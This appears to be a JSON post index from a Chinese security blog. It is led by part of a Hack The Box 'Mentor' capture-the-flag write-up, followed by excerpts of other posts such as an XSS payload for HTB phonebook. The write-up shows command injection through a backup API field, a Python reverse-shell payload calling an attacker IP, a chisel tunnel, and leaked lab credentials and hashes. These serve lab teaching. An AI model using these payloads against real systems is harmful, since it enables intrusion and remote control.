SNMP-NOTIFICATION-MIB::snmpNotifyFullCompliance\nSNMPv2-MIB::sysORID.10 = OID: NOTIFICATION-LOG-MIB::notificationLogMIB\nSNMPv2-MIB::sysORDescr.1 = STRING: The SNMP Management Architecture MIB.\nSNMPv2-MIB::sysORDescr.2 = STRING: The MIB for Message Processing and Dispatching.\nSNMPv2-MIB::sysORDescr.3 = STRING: The management information definitions for the SNMP User-based Security Model.\nSNMPv2-MIB::sysORDescr.4 = STRING: The MIB module for SNMPv2 entities\nSNMPv2-MIB::sysORDescr.5 = STRING: View-based Access Control Model for SNMP.\nSNMPv2-MIB::sysORDescr.6 = STRING: The MIB module for managing TCP implementations\nSNMPv2-MIB::sysORDescr.7 = STRING: The MIB module for managing UDP implementations\nSNMPv2-MIB::sysORDescr.8 = STRING: The MIB module for managing IP and ICMP implementations\nSNMPv2-MIB::sysORDescr.9 = STRING: The MIB modules for managing SNMP Notification, plus filtering.\nSNMPv2-MIB::sysORDescr.10 = STRING: The MIB module for logging SNMP Notifications.\n\nHOST-RESOURCES-MIB::hrSystemUptime.0 = Timeticks: (6273398) 17:25:33.98\nHOST-RESOURCES-MIB::hrSystemDate.0 = STRING: 2023-3-15,3:56:37.0,+0:0\nHOST-RESOURCES-MIB::hrSystemInitialLoadDevice.0 = INTEGER: 393216\nHOST-RESOURCES-MIB::hrSystemInitialLoadParameters.0 = STRING: \"BOOT_IMAGE=/vmlinuz-5.15.0-56-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0\n\"\nHOST-RESOURCES-MIB::hrSystemNumUsers.0 = Gauge32: 0\nHOST-RESOURCES-MIB::hrSystemProcesses.0 = Gauge32: 235\nHOST-RESOURCES-MIB::hrSystemMaxProcesses.0 = INTEGER: 0\nHOST-RESOURCES-MIB::hrSystemMaxProcesses.0 = No more variables left in this MIB View (It is past the end of the MIB tree)\n```\n\n## /admin\n\n可以看到，现在用james的身份，/admin 返回\n\n```\n{\"admin_funcs\":{\"check db connection\":\"/check\",\"backup the application\":\"/backup\"}}\n```\n\n测试 /admin/check， 返回： {\"details\":\"Not implemented yet!\"} \n\n然后测试 /admin/backup，根据response一点点构造\n\n![Untitled](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303158.png)\n\n### command injection\n\n从API生成backup，考虑到有可能将传入的path作为command的参数，然后执行命令\n\n测试如下命令：\n\n```\n{\n\t\t\"path\": \"test; wget  http://10.10.14.32 ;\"\n}\n```\n\n本地收到\n\n![Untitled](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303159.png)\n\n## User flag\n\n参考：[https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) 下的reverse shell cheat sheet\n\n用bash没有成功，用python的（因为网站基于python的web框架）\n\n```\n{\n\t\t\"path\": \"test;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"10.10.14.32\\\",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);' \"\n}\n```\n\n然后是upgrade shell  `^Z`  后，输入\n\n```\nstty raw -echo; fg\n```\n\n到用户 $HOME目录下，获取user.flag\n\n## root flag\n\n在 `/app` 目录下查看Dockerfile，当前网站是在容器内运行。\n\nDockerfile的内容如下：\n\n```docker\nFROM python:3.6.9-alpine\n\nRUN apk --update --upgrade add --no-cache  gcc musl-dev jpeg-dev zlib-dev libffi-dev cairo-dev pango-dev gdk-pixbuf-dev\n\nWORKDIR /app\nENV HOME /home/svc\nENV PATH /home/svc/.local/bin:${PATH}\nRUN python -m pip install --upgrade pip --user svc\nCOPY requirements.txt requirements.txt\nRUN pip install -r requirements.txt\nRUN pip install pydantic[email] pyjwt\nEXPOSE 8000\nCOPY . .\nCMD [\"python3\", \"-m\", \"uvicorn\", \"app.main:app\", \"--reload\", \"--workers\", \"100\", \"--host\", \"0.0.0.0\", \"--port\" ,\"8000\"]\n```\n\n在 `/app/app` 下，有有关这个网站的全部py代码，config.py是空，但是db.py有（地址是docker的地址）\n\n```docker\nDATABASE_URL = os.getenv(\"DATABASE_URL\", \"postgresql://postgres:postgres@172.22.0.1/mentorquotes_db\")\n```\n\n想到之前在推看到的文章： [https://dmesg.app/ufw-vs-docker.html](https://dmesg.app/ufw-vs-docker.html) \n\n![Untitled](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/2023031510.png)\n\n我对这块不太熟悉，所以还是看了大佬的writeup的思路过程。\n\n用https://github.com/jpillora/chisel 的开源\n\n攻击机：\n\n```docker\n./chisel_1.8.1_linux_amd64 server -p 8000 --reverse\n```\n\ncontainer：\n\n用 Chisel 工具建立一个反向隧道（8000端口），将本地客户端的 5432 端口映射到远程服务器 172.22.0.1 的 5432 端口。\n\n```docker\n./chisel_1.8.1_linux_amd64 client 10.10.14.32:8000 R:5432:172.22.0.1:5432\n```\n\n### connect to database\n\n命令\n\n```docker\npsql -h 127.0.0.1 -p 5432 -U postgres\n```\n\n密码也是postgres。输入 `\\list` 查看全部database，发现 mentorquotes_db \n\n1. `\\connect mentorquotes_db`  连接到数据库\n2. `\\dt`\n\n```docker\nmentorquotes_db=# \\dt\n          List of relations\n Schema |   Name   | Type  |  Owner   \n--------+----------+-------+----------\n public | cmd_exec | table | postgres\n public | quotes   | table | postgres\n public | users    | table | postgres \n```\n\n1. `select * from xxx` \n\n```docker\nmentorquotes_db=# select * from users;\nid |         email          |  username   |             password             \n----+------------------------+-------------+----------------------------------\n  1 | james@mentorquotes.htb | james       | 7ccdcd8c05b59add9c198d492b36a503\n  2 | svc@mentorquotes.htb   | service_acc | 53f22d0dfa10dce7e29cd31f4f953fd8\n```\n\n还有一种方法是直接该models，加个password的字段。这样访问api的/users会返回密码\n\n密码是 ： svc@mentorquotes.htb  /  `123meunomeeivani` \n\n### 提权\n\n查看 `/etc/snmp` 目录，用以下命令去查看相关的snmp配置（去除掉注释）\n\n```docker\n/etc/snmp$ cat snmpd.conf | grep -v \"^#\" | grep .\n```\n\n![Untitled](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/2023031511.png)\n\n密码是： `SuperSecurePassword123__` \n\n登录后 `sudo -l` 查看权限\n\n```docker\nsudo /bin/sh\n```\n\n## Reference\n\n- [https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug)\n- [https://www.daehee.com/werkzeug-console-pin-exploit/](https://www.daehee.com/werkzeug-console-pin-exploit/)\n- [https://0xdf.gitlab.io/2023/03/11/htb-mentor.html](https://0xdf.gitlab.io/2023/03/11/htb-mentor.html)\n","link":"/posts/history/htbmentor"},{"title":"[HTB]phonebook | writeup","tags":["HTB","web","刷题","靶场"],"categories":[],"author":"1dayluo","excerpt":"\n输入错误的用户名和密码,发现提示权限失败的message是通过url传输的,构造payload引起alert的弹窗\n\npayload : [`http://178.62.5.61:31279/login?message=<img src=1 onerror=alert(123)>`](http://178.62.5.61:31279/login?message=%3Cimg%20src=1%20onerror=alert(123)%3E)\n\n但是还是需要登陆的,在登陆页面输入wildcards的'*'(用户名和密码均是).因为没有前面的过滤,直接把*传递到后台,所以就能登陆进去了.\n\n进行code review.发现请求了一个/search 的api,如果成功,就显示search后的结果(以table的方式)\n\n","link":"/posts/history/htbphonebook-or-writeup"},{"title":"HTB:Vessel","tags":[],"categories":[],"author":"1dayluo","excerpt":"# HTB：Vessel\n\n关键词： .git,git information leak,express mis-handles,owa 1.7.3, CVE-2022-24637,PyInstall","link":"/posts/history/htbvessel"},{"title":"java RMI（Remote Method Invocation）","tags":[],"categories":[],"author":"1dayluo","excerpt":"\n\n笔记来源：\n\n- [https://is4b3lla3.github.io/2020/06/27/Java RMI学习/#远程方法调用](https://is4b3lla3.github.io/2","link":"/posts/history/java-rmiremote-method-invocation"},{"title":"Java学习笔记: Servlet","tags":["java","学习笔记"],"categories":[],"author":"1dayluo","excerpt":"\n\n重新捡起java诶~\n\n## 基础概念\n\n### J2EE & JAVA EE & jakarta EE\n\n在此之前要知道 ：\n\n> Ever heard of Java EE? How abou","link":"/posts/history/java-xue-xi-bi-ji-servlet"},{"title":"Javascript Prototype Pollution 学习笔记","tags":["javascript","学习笔记","prototype pollution"],"categories":[],"author":"1dayluo","excerpt":"笔记中英文混杂,问就是懒得翻译.学习笔记都是二次吸收,原始文章见Resource&Reference处. 笔记只是留给自己学习反复查阅和理解的......尽可能写的对自己来说全面一些.\n\n~~其实学了","link":"/posts/history/javascript-prototype-pollution-xue-xi-bi-ji"},{"title":"对于Flask的个人理解及安全相关","tags":["flask"],"categories":[],"author":"1dayluo","excerpt":"> 这是一个应付技术分享会的文稿\r\n> 写在开头：\r\n> 技术分享会写的稿子，文字写的很认真。PPT就。。。应付吧，计划用reveal-md生成PPT （反正第一天感觉好多都好水)  据我认真观察，讲","link":"/posts/history/ji-zhu-fen-xiang-hui-wo-dui-yu-flask-jin-qi-li-jie-de-yi-ge-gao-zi"},{"title":"[技术阅读]双查询原理","tags":["技术阅读","知识点巩固"],"categories":[],"author":"1dayluo","excerpt":"# Double_ SQL_Injection/#0x01-双查询\r\n\r\n原文链接：[Double SQL Injection(双查询注入) | Mochazz's blog](https://moc","link":"/posts/history/ji-zhu-yue-du-shuang-cha-xun-yuan-li"},{"title":"[技术阅读]web缓存投毒","tags":["技术阅读","知识点巩固"],"categories":[],"author":"1dayluo","excerpt":"\r\n","link":"/posts/history/ji-zhu-yue-du-web-huan-cun-tou-du"},{"title":"[技术阅读]用github来实现漏洞赏金猎人","tags":["技术阅读","工具篇"],"categories":[],"author":"1dayluo","excerpt":"# GitHub for Bug Bounty Hunters-edoverflow\r\n\r\n原文链接：[GitHub for Bug Bounty Hunters](https://edoverflo","link":"/posts/history/ji-zhu-yue-du-yong-github-lai-shi-xian-lou-dong-shang-jin-xi-ren"},{"title":"JWT Crack总结 （一）","tags":["jwt","ctf","Infosec"],"categories":[],"author":"1dayluo","excerpt":"\n## 场景总结\n\n首先要明白，一个jwt是由三部分组成的：header，payload，signature。三个部分用 `.` 连接，用base64编码且格式要求去掉末尾的 `=`\n\n其他额外需要知","link":"/posts/history/jwt-crack-zong-jie"},{"title":"Length Extension Attack","tags":["刷题","学习笔记","加密攻击"],"categories":[],"author":"1dayluo","excerpt":"\n关键词:MD5, SHA-1,Length Extension Attack\n\n## Outline\n\n网站通常会hash对应的secret以防止被篡改。而Length extension atta","link":"/posts/history/length-extension-attack"},{"title":"《zseano's methodogy》学习笔记","tags":["笔记","学习笔记"],"categories":[],"author":"1dayluo","excerpt":"# 《zseano's methodogy》学习笔记\n\n一些图片没有上传,本地和notion好好的,上传上来格式有些emmm(看阅读时间要35min也能够知道完整的文章目前博客显示不完整),完整笔记可","link":"/posts/history/lesslesszseanos-methodogygreatergreater-xue-xi-bi-ji"},{"title":"理解TLS","tags":["学习笔记","python"],"categories":[],"author":"1dayluo","excerpt":"\r\n\r\n## 为什么需要TLS\r\n前提：每个线程都有TLS\r\n如果我们要在多线程中对全局变量(`Global Variable`)进行操作，除了保护多个线程对该变量内存读写不会有影响（加锁)，同时也要","link":"/posts/history/li-jie-tls"},{"title":"Linux篇:配置你的aria2 - (网盘下载 代替迅雷)","tags":["aria2"],"categories":[],"author":"1dayluo","excerpt":"无聊水篇oao \n昨天用windows配了下aria2下载某度云盘是真的香...打算给自己的arch linux也配一套下载, windows网上有傻瓜包就不复述了.这里讲我在linux下配置的过程,","link":"/posts/history/linux-pian-pei-zhi-ni-de-aria2-wang-pan-xia-zai-dai-ti-xun-lei"},{"title":"Linux篇:配置你的aria2","tags":["aria2"],"categories":[],"author":"1dayluo","excerpt":"无聊水篇oao\n昨天用windows配了下aria2下载某度云盘是真的香...打算给自己的arch linux也配一套下载, windows网上有傻瓜包就不复述了.这里讲我在linux下配置的过程,先","link":"/posts/history/linux-pian-pei-zhi-ni-de-aria2"},{"title":"PHP反序列化笔记","tags":["PHP","学习笔记"],"categories":[],"author":"1dayluo","excerpt":"# 反序列化\n\n概念整理搬运工，都是看各类网上文章整理好久+自己的学习理解才发布的博文ovo 参考见文末，如果有落下欢迎指正。更新最新版见在个人notion，~~不懒的话有更新会及时同步到blog的2","link":"/posts/history/php-fan-xu-lie-hua-bi-ji"},{"title":"氵：openvpn连接htb报错修复：verfiy error","tags":[],"categories":[],"author":"1dayluo","excerpt":"\n~~非常的氵~~\n之前链接一直很成功，在一次pacman -Syu的滚动更新后，发现链接htb的时候一直在报错：\n```\nVERIFY ERROR: depth=0, error=CA signat","link":"/posts/history/san-openvpn-lian-jie-htb-bao-cuo-xiu-fu-verfiy-error"},{"title":"sddm & i3 美化 & 杂谈","tags":["Linux"],"categories":[],"author":"1dayluo","excerpt":"\n\n## 关于sddm\n\n### sddm主题\n\n1. 去arch aur官网，搜索sddm-theme即可，然后列出来的可以去github（\n  Git Clone URL什么的）看一下样式。\n  ","link":"/posts/history/sddm-and-i3-mei-hua-and-za-tan"},{"title":"深入浅出SSRF（一） ： 我的学习笔记","tags":["SSRF","笔记"],"categories":[],"author":"1dayluo","excerpt":"# SSRF(Server-Side Request Forgery)\n\n<aside>\n💡 Make sure the request comes from the remote server a","link":"/posts/history/shen-ru-qian-chu-ssrf-wo-de-xue-xi-bi-ji"},{"title":"深入浅出SSRF（二）：我的学习笔记","tags":["SSRF","笔记"],"categories":[],"author":"1dayluo","excerpt":"困困更blog…… \n之前拿着本来要发blog的文章去“换”了一个会员...其实我不太喜欢闭源小圈子分享（虽然能换积分/社区认同），我还是喜欢自己博客发，要么不发....小透明的坚持，等找工作/需要交","link":"/posts/history/shen-ru-qian-chu-ssrfer-wo-de-xue-xi-bi-ji"},{"title":"使用celery让任务在后台运行（失败，celery不支持windows)","tags":[],"categories":[],"author":"1dayluo","excerpt":"# 什么是celery\r\n     Celery 是一个异步任务队列。你可以使用它在你的应用上下文之外执行任务。总的想法就是你的应用程序可能需要执行任何消耗资源的任务都可以交给任务队列，让你的应用程序","link":"/posts/history/shi-yong-celery-rang-ren-wu-zai-hou-tai-yun-xing-wei-wan"},{"title":"[刷题]水题-memcache安全相关","tags":["刷题"],"categories":[],"author":"1dayluo","excerpt":"\r\n\r\n**写在开头：**\r\n\r\n忙里偷闲刷的题，所以中间有重启lab导致ip变更的情况。\r\n\r\n## Questions\r\n\r\n1. Find the version of memcached server using nmap.\r\n2. Find the version information using netcat or telnet.\r\n3. Find the maximum number of simultaneous incoming connections allowed by the memcached server use available nmap scripts.\r\n4. Find the number of current items on the memcached server using memcstat.\r\n5. Find the value stored in the key 'flag' from the key value pairs dumped by available Metasploit module.\r\n6. Find the name of all keys present on the memcached server using memcdump.\r\n7. Find the value stored in key “first_name” using memcached-tool.\r\n","link":"/posts/history/shua-ti-shui-ti-memcache-an-quan-xiang-guan"},{"title":"spring 基础概念笔记","tags":["java","学习笔记"],"categories":[],"author":"1dayluo","excerpt":"\n\n基于廖雪峰老师网站所做的java学习笔记。为了快速审计java代码，而非开发~\n\n\n## IOC\n\n**Ioc容器**，负责把一些service和datasource包装起来，并且管理创建和销毁\n","link":"/posts/history/spring-ji-chu-gai-nian-bi-ji"},{"title":"Symfony RCE 分析","tags":["学习笔记","PHP","漏洞分析"],"categories":[],"author":"1dayluo","excerpt":"笔记与总结，笔记/参考见文末。阅读exp代码的心得忽略。\n\n## 概括\n\nSymfony framwork为一个PHP application，并且用于许多知名CMS中，包括Drupal，Joomla","link":"/posts/history/synfony-rce-fen-xi"},{"title":"推荐一下自己开发的论坛:蛋憨","tags":[],"categories":[],"author":"1dayluo","excerpt":"\n\n名字的起因是本想给男朋友搭建一个共同的情侣空间.但是后面随着开发,变成了论坛(吐舌) \n\n这个项目断断续续的,今年年末的时候不知道为啥突然拾起了这个年初挖的坑,继续给todo增添了几笔.甚至觉得明年,或者后年,我可以开发更多有趣的东西,比如一直想做的:做一款自己的游戏,上架steam\n\n目前还是半完成品,部署在heroku上的可能会有一些显示错误\n\n项目地址: https://github.com/1dayluo/flasklearn-secretsapce \n\n","link":"/posts/history/tui-jian-yi-xia-zi-ji-kai-fa-de-lun-tan-dan-han"},{"title":"Vue学习笔记","tags":["vue","前端","全栈"],"categories":[],"author":"1dayluo","excerpt":"通过一天时间了解了一下vue，把一些对于新人来说比较混淆/不清楚的概念总结了一下\r\n\r\n# Vue基本组件学习记录\r\n\r\n## 简单组件sample\r\n\r\n![Image](https://i.loli.net/2020/12/03/LbFE5mSApPRhJXe.png)\r\n\r\n## 局部注册\r\n\r\n![Image](https://i.loli.net/2020/12/03/vbGenP2js36Mo7V.png)\r\n\r\n# 基础指令\r\n\r\n## v-bind\r\n\r\nv-bind解释\r\n\r\n![Image](https://i.loli.net/2020/12/03/EYJrAj9caf1i6N3.png)\r\n\r\n","link":"/posts/history/vue-xue-xi-bi-ji"},{"title":"[wafbypass]使用python发送chunked","tags":[],"categories":[],"author":"1dayluo","excerpt":"遇到云盾，网上查询bypass方法一有利用http协议中，使用chunked编码分块发送HTTP消息。既然以后会用到就干脆写一个发送工具好啦（仅供参考）\r\n我也不知道自己写的对不对_(:3_|/_)独自摸索x\r\n> 参考：\r\n>-  https://stackoverflow.com/questions/24500752/how-can-i-read-exactly-one-response-chunk-with-pythons-http-client\r\n> - https://cloud.tencent.com/developer/article/1606911\r\n\r\n\r\nchunked编码格式如下\r\n\r\n**格式：**\r\n\r\n- 如果一个HTTP消息（请求消息或应答消息）的Transfer-Encoding消息头的值为chunked，那么，消息体由数量未定的块组成，并以最后一个大小为0的块为结束。\r\n\r\n- 每一个非空的块都以该块包含数据的字节数（字节数以十六进制表示）开始，跟随一个CRLF （回车及换行），然后是数据本身，最后块CRLF结束。在一些实现中，块大小和CRLF之间填充有白空格（0x20）。\r\n\r\n- 最后一块是单行，由块大小（0），一些可选的填充白空格，以及CRLF。最后一块不再包含任何数据，但是可以发送可选的尾部，包括消息头字段。消息最后以CRLF结尾。\r\n\r\n","link":"/posts/history/wafbypassshi-yong-python-fa-song-chunked"},{"title":"我的「搞机」日常（破真）  - 开源系统GrapheneOS的推荐","tags":[],"categories":[],"author":"1dayluo","excerpt":"## 开端\n\n关于我是怎么突然想到需要搞机想法，说（一）来（篇）话（水）长（文）系列（？）\n\n如果从手机算起的话（~~不算高中生涯的尝试给自己ipod越狱，最后第二次越狱变砖没敢告诉我爹这件事的话~~","link":"/posts/history/wo-de-gao-ji-ri-chang-po-zhen-kai-yuan-xi-tong-grapheneos-de-tui-jian"},{"title":"我的学习笔记和一些项目&吐槽","tags":[],"categories":[],"author":"1dayluo","excerpt":"\n\n## 🌸我的Notion笔记 & stars list\nBurpsuite lab刷题笔记:\n- [https://cubic-brace-c93.notion.site/Learning-Pa","link":"/posts/history/wo-de-xue-xi-bi-ji-he-yi-xie-xiang-mu"},{"title":"我好困 11月的水文一份","tags":[],"categories":[],"author":"1dayluo","excerpt":"我好困我好困我好困……生命的意义在于折腾Zzzz\n说起来虽然一直知道：闷声发大财 ，不需要在意别人的看法。\n但是最近才想通，自己确实不需要去迎合别人。 就是，想通后是情绪有转变：不会因为孤独产生一些过","link":"/posts/history/wo-hao-kun-11-yue-de-shui-wen-yi-fen"},{"title":"线程捕获KeyboardInterrupter","tags":["python"],"categories":[],"author":"1dayluo","excerpt":"\r\n\r\n线程捕获KeyboardInterrupter不能简单用`try....except`.......来捕获。原因在stackover上说的很明白：This is a Python bug. W","link":"/posts/history/xian-cheng-bu-huo-keyboardinterrupter"},{"title":"小玩具开发:tg收取mailslurp匿名邮件","tags":[],"categories":[],"author":"1dayluo","excerpt":"## 写在开头\n因为日常会经常用到匿名邮箱进行测试/注册一些临时用户, 觉得web页面有点麻烦, 而且批量收发的话,把APT KEY写一起,然后集中管理多个不同帐号下的邮箱会比较方便.于是写了一个基于","link":"/posts/history/xiao-wan-ju-kai-fa-tg-shou-qu-mailslurp-ni-ming-you-jian"},{"title":"新主题：Cute-Notes & 简明二次开发指北","tags":["前端","折腾","全栈"],"categories":[],"author":"1dayluo","excerpt":"年前就有自定义自己的blog主题的想法，直到tg有人问我当前默认主题我也没有开动，但是提醒了我之前的这个计划……趁着过年补学了nodejs的web framework：express和view eng","link":"/posts/history/xin-zhu-ti-cute-notes-and-jian-ming-er-ci-kai-fa-zhi-bei"},{"title":"XSS进阶学习分享（一）","tags":["XSS","笔记","知识点巩固","学习笔记"],"categories":[],"author":"1dayluo","excerpt":"\n~~偷悄悄：其实是技术分享用的PPT大纲~~\n\n后续会在blog继续更一些之前看到的h1的xss构造攻击链为rce的文章（或许）\n更新了文章：https://1dayluo.github.io/po","link":"/posts/history/xss-jin-jie-xue-xi-fen-xiang-yi"},{"title":"XSS水题篇：关于DOM Colbbering一些个人理解","tags":["XSS","学习笔记","技术阅读"],"categories":[],"author":"1dayluo","excerpt":"遇到一个DOM Colbbering题目\n题目\n\n```jsx\nfunction escape(input) {\n    // let's do a post redirection\n    try ","link":"/posts/history/xss-shui-ti-pian-guan-yu-dom-colbbering-yi-xie-ge-ren-li-jie"},{"title":"一篇针对工作后的反思（或许)的碎碎念 ","tags":[],"categories":[],"author":"1dayluo","excerpt":"大概写一下就继续忙自己的了。因为整理周报和今天下午要干的流程图突然觉得要梳理一下，自勉一下。\r\n  从7月份开始，突然打算在提交工作周报的基础上总结一下周报，确保自己能够确认工作是确实能让自己学到新的","link":"/posts/history/yi-pian-zhen-dui-gong-zuo-hou-de-fan-si-huo-xu-de-sui-sui-nian"}]
